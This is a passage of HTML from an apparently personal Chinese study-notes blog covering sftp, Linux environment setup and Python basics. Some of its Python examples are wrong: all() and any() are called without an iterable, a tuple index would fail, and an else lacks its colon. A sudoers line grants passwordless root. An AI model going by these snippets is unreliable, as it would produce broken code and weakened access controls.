sftp</span><br><span class="line">get [-Ppr] remote [local]          Download file</span><br><span class="line">help                               Display this help text</span><br><span class="line">lcd path                           Change local directory to 'path'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在命令前加一个 <span class="string">'l'</span>，即在本地操作</span></span><br><span class="line">lls / lpwd / lcd</span><br><span class="line">get remote_file_name  # 远程下载</span><br><span class="line">get remote_file_name local_name_file</span><br><span class="line">get -r directory_name  # 递归下载文件夹</span><br><span class="line">put local_file_name  # 上传</span><br><span class="line">put -r directory_name</span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul><li><p>Ubuntu 卸载不常用软件</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt purge libreoffice-common -y</span><br><span class="line">apt purge unity-webapps-common -y </span><br><span class="line">apt purge thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install -y</span><br><span class="line">apt purge deja-dup -y</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>centos 初始配</p><p>==网络部分==</p><p>新安装Centos 7，执行<code>dhclient</code>,系统会从dhcp服务器获取到IP地址。</p><p>执行<code>ip add</code>命令查看网卡信息，<strong>完整命令为ip address</strong>。</p><p>重启DHCP服务的命令为<code>dhclient -r</code></p><p>1、打开配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-script/ifcfg-eth0</span><br></pre></td></tr></table></figure><p>2、修改配置文件</p><p>（1）动态获取IP配置（可选1）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ONBOOT=yes</span><br><span class="line">MM_Controlled=no</span><br><span class="line">BOOTPROTO=dhcp</span><br></pre></td></tr></table></figure><p>（2）设置固定IP配置（可选2）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ONBOOT=yes</span><br><span class="line">MM_Controlled=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.1.33</span><br><span class="line">BROADCAST=192.168.1.255</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">DNS1=192.168.1.1</span><br><span class="line">DNS2=192.168.1.2</span><br></pre></td></tr></table></figure><p>3、重启网卡</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl restart network</span></span><br></pre></td></tr></table></figure><p>附（网络配置文件eth0配置项说明）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TYPE=Ethernet       #网卡类型</span><br><span class="line">DEVICE=eth0         #网卡接口名称</span><br><span class="line">ONBOOT=yes          #系统启动时是否自动加载</span><br><span class="line">BOOTPROTO=static    #启用地址协议 --static:静态协议 --bootp协议 --dhcp协议</span><br><span class="line">IPADDR=192.168.1.11      #网卡IP地址</span><br><span class="line">NETMASK=255.255.255.0    #网卡网络地址</span><br><span class="line">GATEWAY=192.168.1.1      #网卡网关地址</span><br><span class="line">DNS1=10.203.104.41       #网卡DNS地址</span><br><span class="line">HWADDR=00:0C:29:13:5D:74 #网卡设备MAC地址</span><br><span class="line">BROADCAST=192.168.1.255  #网卡广播地址</span><br></pre></td></tr></table></figure><p>==vmtools==</p><p><a href="https://www.linuxidc.com/Linux/2017-05/143323.htm" target="_blank" rel="noopener">教程链接</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 卸载</span></span><br><span class="line">usr/bin/vmware-uninstall-tools.pl</span><br><span class="line">rm -rvf /usr/lib/vmware-tools</span><br></pre></td></tr></table></figure></li><li><p>visudo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 不输密码</span></span><br><span class="line">user_name ALL=(ALL) NOPASSWD: ALL</span><br><span class="line"><span class="meta">#</span><span class="bash"> group</span></span><br><span class="line">user_name ALL=(ALL) NOPASSWD: ALL</span><br><span class="line"><span class="meta">%</span><span class="bash">admin ALL=(ALL) NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure></li><li><p>py3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Anaconda</span></span><br><span class="line">安装时选择添加到环境变量</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改包管理镜像为国内源</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --set show_channel_urls yes</span><br><span class="line">conda upgrade --all  # 更新所有库</span><br><span class="line">conda install numpy scipy pandas  # 安装库</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置 pycharm 时选择 System py 解释器</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 直接装Python</span></span><br><span class="line">sudo apt-get install -y python3-dev build-essential libssl-dev libffi-dev libxml2 libxml2-dev libxslt1-dev zlib1g-dev libcurl4-openssl-dev</span><br><span class="line">sudo apt-get install -y python3</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y python3-pip</span><br></pre></td></tr></table></figure></li><li><p>Chrome</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line">sudo dpkg -i google-chrome-stable_current_amd64.deb; sudo apt-get -fy install</span><br></pre></td></tr></table></figure></li><li><p>ChromeDriver</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 一定要看文档选择合适的版本呀......不然怀疑人生</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://sites.google.com/a/chromium.org/chromedriver/downloads</span></span><br><span class="line">sudo apt-get install unzip</span><br><span class="line"></span><br><span class="line">wget -N http://chromedriver.storage.googleapis.com/2.26/chromedriver_linux64.zip</span><br><span class="line">unzip chromedriver_linux64.zip</span><br><span class="line">chmod +x chromedriver</span><br><span class="line"></span><br><span class="line">sudo mv -f chromedriver /usr/local/share/chromedriver</span><br><span class="line">sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver</span><br><span class="line">sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</span><br></pre></td></tr></table></figure></li><li><p>MongoDB <a href="https://www.digitalocean.com/community/tutorials/how-to-install-mongodb-on-ubuntu-18-04" target="_blank" rel="noopener">详细</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Installing MongoDB</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y mongodb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Checking the Service and Database</span></span><br><span class="line">sudo systemctl status mongodb</span><br><span class="line">● mongodb.service - An object/document-oriented database</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/mongodb.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since Sat 2018-05-26 07:48:04 UTC; 2min 17s ago</span><br><span class="line">     Docs: man:mongod(1)</span><br><span class="line"> Main PID: 2312 (mongod)</span><br><span class="line">    Tasks: 23 (limit: 1153)</span><br><span class="line">   CGroup: /system.slice/mongodb.service</span><br><span class="line">           └─2312 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf</span><br><span class="line"></span><br><span class="line">mongo --eval 'db.runCommand(&#123; connectionStatus: 1 &#125;)'  # version, address and port</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Managing the MongoDB Service</span></span><br><span class="line">sudo systemctl status/stop/start/restart mongodb</span><br><span class="line">sudo systemctl disable/enable mongodb  # automatic startup</span><br></pre></td></tr></table></figure></li></ul><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>终端下光标移动：</p><p>CTRL + a 跳至行首</p><p>CTRL + b / f 前后移动</p><p>CTRL + u 删掉光标前的所有字符</p><p>CTRL + k 删掉光标后的所有字符</p><p>CTRL + h 往前删一个</p><p>CTRL + d 往后删一个</p><p>CTRL + x  CTRL + e 进入编辑器编辑当前命令</p><p>CTRL + p / n 切换历史命令</p><h3 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h3><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="易错"><a href="#易错" class="headerlink" title="易错"></a>易错</h3><p>functions decision control， </p><p>loops and booleans，</p><p>simulation and design，</p><p>classes， </p><p>data collection，</p><p>object-oriented design  algorithms</p><p><strong>单词</strong></p><ul><li>mutable  易变的</li><li>invoke  v.  唤起，调用</li><li>shuffle  n. v.  搅乱，洗牌</li></ul><p>list</p><ul><li><p>list1 = [1, 3]<br>  list2 = list1<br>  list1[0] = 4</p><p>  list2 = [4, 3]  相当于引用？</p></li><li><p>def f(i, values = []):<br>​    ​    values.append(i)<br>​    ​    return values</p><p>f(1)<br>f(2)<br>v = f(3)<br>print(v)  </p><p><strong>v = [1, 2, 3]</strong></p></li><li><p>random.shuffle(list1)  打乱顺序</p></li><li>list1 = [11, 2, 23] and list2 = [2, 11, 23], list1  !=  list2</li><li>insert(index, data)  index 从0开始</li><li>pop()  删除末尾元素 pop(index) 删除索引为 index 元素</li><li>remove() 删除指定元素</li><li>append() 在末尾追加元素</li><li>count() 输出元素出现次数</li><li>sort() 默认从小到大排序</li><li>reverse() 反转</li><li>extend() 在列表末尾一次性追加另一个序列中的多个值</li><li>If a key is not in the list, the binarySearch function returns <strong>-(insertion point + 1)</strong></li></ul><p>tuple</p><ul><li>一旦初始化就不能改变，string 也是？</li><li>上面的初始化后不能改变也是有条件的， Python tuple is immutable if every element in the tuple is immutable. 比如 tuple 中有个 list，也是可以变得</li><li>没有append，insert这些方法</li><li>定义一个空元组()，</li><li>定义一个元素的元组需要用(1,)，以此与单纯的小括号区分</li><li>The elements in a tuple or list are ordered!  =&gt;  元素相对顺序确定，不是已排好序，能不能直接 [] 来访问</li></ul><p>切片</p><ul><li>[a:b]  =&gt; [a, b) 从 a 开始，不包括 b</li><li>a = 0 是可省略，b 为最后一个也可省略</li><li>为负数时意味着倒数</li><li>[a:\b:c] c 为步长 ，L[::-1] 逆转</li><li>tuple也能切片，切出来仍然是一个tuple</li><li>L[1:-1]  =&gt;  第一个到倒数第二个</li><li>L = (1,2)  =&gt; 2*L = (1, 2, 1, 2)</li></ul><p>dict</p><ul><li>{}  创建空 dict，{1,2} 是 set，d = {40:”john”, 45:”peter”} 这样也是正确的</li><li>直接 d[‘xxx’] ，如果 xxx 不存在就会报错：KeyError（事先 in 判断一下），此时可以用 get() ，不存在就会返回 none</li><li>使用 pop() 删除 key，其对应的 value 也会被删掉</li><li>dict 无 delete 方法，可以 del d[“john”]，不能 del d(“john”:40)</li><li>dict 之间无法进行 &gt; 大小比较，但是可以判断是否相等</li></ul><p>set</p><ul><li>set() 创建空 set</li><li>list(“abac”)  =&gt;  [‘a’, ‘b’, ‘a’, ‘c’]</li><li>tuple(“abac”)  =&gt;  (‘a’, ‘b’, ‘a’, ‘c’)</li><li>set(“abac”)  =&gt;  {‘a’, ‘b’, ‘c’}  重复元素在set中自动被过滤</li><li>add() 添加元素，remove() 删除元素</li><li>两个 set 进行 &lt; , &gt;比较，比的是 集合的包含关系</li><li>set 中的元素不能通过 [] 索引来获取</li><li>s1.issubset(s2)  =&gt;  s1 是 s2 的子集</li><li>s1 ^ s2  =&gt;  (s1-s2) | (s2-s1)</li><li>2 * s1 是非法的</li><li>不能 s1 + s2，取并集只能 | </li></ul><p>file IO</p><ul><li>如果文件不存在，<code>open()</code>函数就会抛出一个<code>IOError</code>的错误，并且给出错误码和详细的信息告诉你文件不存在</li><li>read(size)  每次读取size个字节内容，为写size则读取全部内容</li><li>readline() 每次读取一行内容，读取下一行</li><li>readlines() 一次读取所有内容并返回 list</li><li>os.path.exists(‘/etc/passwd’) 判断是否存在</li><li>dialog</li></ul><p><strong>小诗</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"""Gur Mra bs Clguba, ol Gvz Crgref</span></span><br><span class="line"><span class="string">Ornhgvshy vf orggre guna htyl.</span></span><br><span class="line"><span class="string">Rkcyvpvg vf orggre guna vzcyvpvg.</span></span><br><span class="line"><span class="string">Fvzcyr vf orggre guna pbzcyrk.</span></span><br><span class="line"><span class="string">Pbzcyrk vf orggre guna pbzcyvpngrq.</span></span><br><span class="line"><span class="string">Syng vf orggre guna arfgrq.</span></span><br><span class="line"><span class="string">Fcnefr vf orggre guna qrafr.</span></span><br><span class="line"><span class="string">Ernqnovyvgl pbhagf.</span></span><br><span class="line"><span class="string">Fcrpvny pnfrf nera'g fcrpvny rabhtu gb oernx gur ehyrf.</span></span><br><span class="line"><span class="string">Nygubhtu cenpgvpnyvgl orngf chevgl.</span></span><br><span class="line"><span class="string">Reebef fubhyq arire cnff fvyragyl.</span></span><br><span class="line"><span class="string">Hayrff rkcyvpvgyl fvyraprq.</span></span><br><span class="line"><span class="string">Va gur snpr bs nzovthvgl, ershfr gur grzcgngvba gb thrff.</span></span><br><span class="line"><span class="string">Gurer fubhyq or bar-- naq cersrenoyl bayl bar --boivbhf jnl gb qb vg.</span></span><br><span class="line"><span class="string">Nygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh'er Qhgpu.</span></span><br><span class="line"><span class="string">Abj vf orggre guna arire.</span></span><br><span class="line"><span class="string">Nygubhtu arire vf bsgra orggre guna *evtug* abj.</span></span><br><span class="line"><span class="string">Vs gur vzcyrzragngvba vf uneq gb rkcynva, vg'f n onq vqrn.</span></span><br><span class="line"><span class="string">Vs gur vzcyrzragngvba vf rnfl gb rkcynva, vg znl or n tbbq vqrn.</span></span><br><span class="line"><span class="string">Anzrfcnprf ner bar ubaxvat terng vqrn -- yrg'f qb zber bs gubfr!"""</span></span><br><span class="line"></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> (<span class="number">65</span>, <span class="number">97</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        d[chr(i+c)] = chr((i+<span class="number">13</span>) % <span class="number">26</span> + c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join([d.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br></pre></td></tr></table></figure><h3 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ord()  <span class="comment"># ASCII码</span></span><br><span class="line">chr()  <span class="comment"># 对应char</span></span><br><span class="line">isinstance(x, str)   <span class="comment"># 判断x是否是字符串？</span></span><br><span class="line"></span><br><span class="line">zip()<span class="comment"># 拉链，打包成一个个元组</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">zipped = zip(a, b)</span><br><span class="line">zipped = [(<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">5</span>), (<span class="number">3</span>, <span class="number">6</span>)]</span><br><span class="line">c = zip(*zipped)<span class="comment"># 相当于解压，返回二维矩阵式</span></span><br><span class="line">c = [(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">all(<span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>)<span class="comment"># 全为真才为真（与）</span></span><br><span class="line">any(<span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>)<span class="comment"># 有真即为真（或）</span></span><br><span class="line">arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">sum(arr)<span class="comment"># arr元素的和</span></span><br><span class="line">max(arr)<span class="comment"># arr的最大值</span></span><br><span class="line">min(arr)<span class="comment"># arr的最小值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入MySQL驱动:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="comment"># 注意把password设为你的root口令:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = mysql.connector.connect(user=<span class="string">'root'</span>, password=<span class="string">'password'</span>, database=<span class="string">'test'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor = conn.cursor()</span><br><span class="line"><span class="comment"># 创建user表:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.execute(<span class="string">'create table user (id varchar(20) primary key, name varchar(20))'</span>)</span><br><span class="line"><span class="comment"># 插入一行记录，注意MySQL的占位符是%s:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.execute(<span class="string">'insert into user (id, name) values (%s, %s)'</span>, [<span class="string">'1'</span>, <span class="string">'Michael'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.rowcount</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment"># 提交事务:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn.commit()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.close()</span><br><span class="line"><span class="comment"># 运行查询:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor = conn.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.execute(<span class="string">'select * from user where id = %s'</span>, (<span class="string">'1'</span>,))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values = cursor.fetchall()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>values</span><br><span class="line">[(<span class="string">'1'</span>, <span class="string">'Michael'</span>)]</span><br><span class="line"><span class="comment"># 关闭Cursor和Connection:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cursor.close()</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn.close()</span><br></pre></td></tr></table></figure><h3 id="Tuple-与-List"><a href="#Tuple-与-List" class="headerlink" title="Tuple 与 List"></a>Tuple 与 List</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># []————list</span></span><br><span class="line">classmates = [<span class="string">'Michael'</span>, <span class="string">'Bob'</span>, <span class="string">'Tracy'</span>]</span><br><span class="line">classmates.append(<span class="string">'xiaoyu'</span>)</span><br><span class="line">print(classmates[<span class="number">-1</span>])</span><br><span class="line">classmates.pop()</span><br><span class="line">print(classmates[<span class="number">-1</span>])</span><br><span class="line">s = [<span class="string">'python'</span>, <span class="string">'java'</span>, [<span class="string">'asp'</span>, <span class="string">'php'</span>], <span class="string">'scheme'</span>]</span><br><span class="line">print(len(s))  </span><br><span class="line"></span><br><span class="line"><span class="comment"># ()————tuple</span></span><br><span class="line">t = (<span class="string">'jj'</span>,)  <span class="comment"># 单个元素时加“，” 是为了消除()带来的歧义,防止解释器理解为数学上的小括号</span></span><br><span class="line"><span class="comment"># 一旦定义则不可变的tuple的意义为相比list更安全,所以能用tuple的地方不要用list</span></span><br><span class="line">t = (<span class="string">'a'</span>,<span class="string">'b'</span>,[<span class="string">'A'</span>,<span class="string">'B'</span>])</span><br><span class="line">t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">'B'</span></span><br><span class="line">t[<span class="number">2</span>][<span class="number">2</span>] = <span class="string">'A'</span></span><br><span class="line"><span class="comment"># 此时的tuple又变长“可变”了，原因只有一个，tuple的不变说的是指向不变，而不是说元素不变</span></span><br><span class="line">print(len(t))</span><br><span class="line"></span><br><span class="line">length = input(<span class="string">'请输入你的身高：'</span>)</span><br><span class="line">height = input(<span class="string">'请输入你的体重:'</span>)<span class="comment"># input()函数直接返回的是str类型</span></span><br><span class="line">length = int(length) <span class="comment"># 所以需要先强制转换一下</span></span><br><span class="line">height = int(height)</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">names = [<span class="string">'Michael'</span>, <span class="string">'Bob'</span>, <span class="string">'Tracy'</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">101</span>):</span><br><span class="line">    sum += x</span><br><span class="line">print(sum)</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">n = <span class="number">99</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    sum += n</span><br><span class="line">    n -= <span class="number">1</span></span><br><span class="line">print(sum)</span><br><span class="line"></span><br><span class="line">L = [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>, <span class="string">'Adam'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> L:</span><br><span class="line">    print(<span class="string">'Hello,%s'</span> % l)</span><br></pre></td></tr></table></figure><h3 id="Dist-与-Set"><a href="#Dist-与-Set" class="headerlink" title="Dist 与 Set"></a>Dist 与 Set</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dist 相当于STL中的map,采用 key—value 存储</span></span><br><span class="line">d = &#123;<span class="string">'Michael'</span>: <span class="number">95</span>, <span class="string">'Bob'</span>: <span class="number">75</span>, <span class="string">'Tracy'</span>: <span class="number">85</span>&#125;</span><br><span class="line">d[<span class="string">'Michael'</span>] = <span class="number">95</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set 与 dist 类似，但不存储 value。</span></span><br><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">add()  <span class="comment"># s.add(4)</span></span><br><span class="line">remove()  <span class="comment"># s.remove(4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set 可看做数学意义上的无序和无重复元素的集合，因此，两个 set 可以做数学意义上的交、并集操作</span></span><br><span class="line">s1 = set(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;)</span><br><span class="line">s2 = set(&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;)</span><br><span class="line">s1 &amp; s2</span><br><span class="line">s1 | s2</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li>pass————如果想定义一个什么事也不做的函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如现在没想好写函数的具体实现，就可以使用 pass 占位，使得程序先跑起来</span></span><br><span class="line"><span class="comment"># 没写 pass 的空函数将会报错</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>isinstance()————内置了参数类型检查函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_abs</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(x, (int, float)):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Bad operand type'</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> -x</span><br></pre></td></tr></table></figure><ul><li>函数返回多个值(本质就是返回一个tuple)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 